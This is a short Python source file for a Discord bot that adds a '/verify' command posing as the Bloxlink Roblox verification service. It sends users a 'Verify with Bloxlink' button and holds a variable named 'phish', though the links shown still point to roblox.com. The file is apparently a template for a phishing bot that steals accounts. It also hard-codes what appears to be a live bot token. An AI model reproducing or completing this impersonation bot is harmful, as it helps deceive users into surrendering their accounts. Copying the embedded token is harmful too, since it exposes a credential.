import discord
import datetime
from discord import app_commands
from discord.ext import commands
from discord.ui import Button, View
import asyncio


#EDIT ME
TOKEN = 'MTA1NzA0MTk4MTk3MDMyMTQ2OA.GHWlek.4Wqoc-iyWGXjFyabSRb3E7kheGOWzneMBk2ZaY' #INSTERT YOUR BOT TOKEN THERE
guildid = '1057041673768685628'
client = commands.Bot(command_prefix='/', intents=discord.Intents.all(), case_insensitive=True, self_bot=True)
hyperlink = "https://www.roblox.com/games/1271943503/Bloxlink-Verification-Game"
phish = "https://www.roblox.com"
VERIFYBUTTON = Button(label="Verify with Bloxlink", url="https://roblox.com")






@client.event
async def setup_hook():
    print("BOT UP AND RUNNING")
    synced = await client.tree.sync()
    print(f"synced {len(synced)} command(s")
    
    

@client.tree.command(name="verify", description="Link your Roblox account to your Discord account and get your server roles")
async def verify(interaction: discord.Interaction):
    


    view = View()
    view.add_item(VERIFYBUTTON)
    await interaction.response.send_message("To verify with Bloxlink, click the link below.", view=view)   
   






client.run(TOKEN)
